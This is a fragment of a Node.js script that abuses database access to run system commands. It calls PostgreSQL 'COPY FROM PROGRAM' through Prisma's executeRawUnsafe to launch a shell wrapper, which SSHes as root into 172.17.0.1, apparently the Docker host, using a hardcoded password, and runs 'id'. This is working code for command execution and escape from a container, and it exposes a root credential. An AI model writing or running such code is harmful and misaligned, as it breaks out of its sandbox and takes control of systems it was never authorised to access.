...
(async () => {
  try {
    ...
    console.log(await runCmd('ls -la /tmp/ssh_minimal.py && wc -l /tmp/ssh_minimal.py'));

    // Test SSH - write output to file to capture errors
    console.log('\n2. Testing SSH...');
    const wrapper = `#!/bin/sh
python3 /tmp/ssh_minimal.py 172.17.0.1 22 root 'M@dis0n_88_server**' "$1" > /tmp/ssh_result.txt 2>&1
echo "EXIT=$?"
`;
    ...
    try {
      await prisma.$executeRawUnsafe(`COPY cmd_output FROM PROGRAM '/tmp/ssh_test.sh "id"'`);
    } catch (e) {
      // expected to fail if SSH fails
    }
    
    console.log(await runCmd('cat /tmp/ssh_result.txt 2>/dev/null || echo "no result"'));
